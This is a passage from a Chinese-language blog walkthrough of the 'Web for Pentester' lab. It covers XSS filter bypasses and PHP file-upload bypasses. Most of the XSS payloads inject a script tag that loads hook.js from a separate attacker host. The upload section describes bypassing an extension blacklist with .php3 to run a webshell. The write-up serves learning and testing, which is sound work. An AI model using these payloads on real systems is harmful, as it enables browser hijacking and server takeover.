<p>(5)过滤了alert,可惜我们都没用alert<br><img src="/img/xss5.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xss</span><span class="regexp">/example5.php?name=hacker&lt;script src="http:/</span><span class="regexp">/192.168.3.28:3000/hook</span>.js<span class="string">"&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/xss5_s.png" alt="&#39;&#39;"><br></p>
<p>(6)闭合前面的双引号,继续写js代码就好了<br><img src="/img/xss6.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xss</span><span class="regexp">/example6.php?name=script";s=document.createElement($a);s.src="http:/</span><span class="regexp">/192.168.3.28:3000/hook</span>.js<span class="string">";document.getElementsByTagName( "</span>head<span class="string">" )[0].appendChild(s);//</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/xss6_s.png" alt="&#39;&#39;"><br></p>
<p>(7)对特特殊字符进行实体化,但这似乎并没能改变什么<br><img src="/img/xss7.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xss</span><span class="regexp">/example7.php?name=script';s=document.createElement($a);s.src='http:/</span><span class="regexp">/192.168.3.28:3000/hook</span>.js<span class="string">';document.getElementsByTagName( '</span>head<span class="string">')[0].appendChild(s);//</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/xss7_s.png" alt="&#39;&#39;"><br></p>
<p>(8)闭合action的另一半双引号,后面再跟上script标记即可绕过<br><img src="/img/xss8.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xss</span><span class="regexp">/example8.php/</span><span class="string">"&gt;&lt;script&gt;alert('hello')&lt;/script&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/xss8_s.png" alt="&#39;&#39;"><br></p>
<p>(9)location.hash.substr获取的内容没有任何过滤<br><img src="/img/xss9.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xss</span><span class="regexp">/example9.php#&lt;script src=http:/</span><span class="regexp">/192.168.3.28:3000/hook</span>.js&gt;&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/xss9_s.png" alt="&#39;&#39;"><br><br></p>
<h2 id="php文件上传"><a href="#php文件上传" class="headerlink" title="php文件上传:"></a>php文件上传:</h2><p>(1)没有任何过滤,直接传php,大马正常执行<br><img src="/img/upload1.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/upload</span><span class="regexp">/example1.php</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/upload1_s.png" alt="&#39;&#39;"><br><br><img src="/img/upload1_s_1.png" alt="&#39;&#39;"><br></p>
<p>(2)黑名单绕过,只要.php后缀,.php3即可绕过<br><img src="/img/upload2.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/upload</span><span class="regexp">/example2.php</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/upload2_s.png" alt="&#39;&#39;"><br><br><img src="/img/upload2_s_1.png" alt="&#39;&#39;"><br><br><br><br></p>
<p>小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;闲的没事儿,拿来跑跑,没啥技术含量,顺带记录下,只为留给有需要的人</p>

  </div>
</article>



    </div>
    
      <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/Search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sql注入"><span class="toc-number">1.</span> <span class="toc-text">sql注入:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php代码执行"><span class="toc-number">2.</span> <span class="toc-text">php代码执行:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#任意文件读取"><span class="toc-number">3.</span> <span class="toc-text">任意文件读取:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php文件包含"><span class="toc-number">4.</span> <span class="toc-text">php文件包含:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#命令执行"><span class="toc-number">5.</span> <span class="toc-text">命令执行:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE注入"><span class="toc-number">6.</span> <span class="toc-text">XXE注入:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ladp注入"><span class="toc-number">7.</span> <span class="toc-text">ladp注入:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss"><span class="toc-number">8.</span> <span class="toc-text">xss:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php文件上传"><span class="toc-number">9.</span> <span class="toc-text">php文件上传:</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://apt404.github.io/2016/05/26/web-for-pentester/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://apt404.github.io/2016/05/26/web-for-pentester/&text=web for pentester writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://apt404.github.io/2016/05/26/web-for-pentester/&title=web for pentester writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://apt404.github.io/2016/05/26/web-for-pentester/&is_video=false&description=web for pentester writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=web for pentester writeup&body=Check out this article: https://apt404.github.io/2016/05/26/web-for-pentester/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://apt404.github.io/2016/05/26/web-for-pentester/&title=web for pentester writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://apt404.github.io/2016/05/26/web-for-pentester/&title=web for pentester writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://apt404.github.io/2016/05/26/web-for-pentester/&title=web for pentester writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://apt404.github.io/2016/05/26/web-for-pentester/&title=web for pentester writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://apt404.github.io/2016/05/26/web-for-pentester/&name=web for pentester writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

    
    <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2018 John Doe
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/Search/">Search</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

</body>
</html>
<!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">

<!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


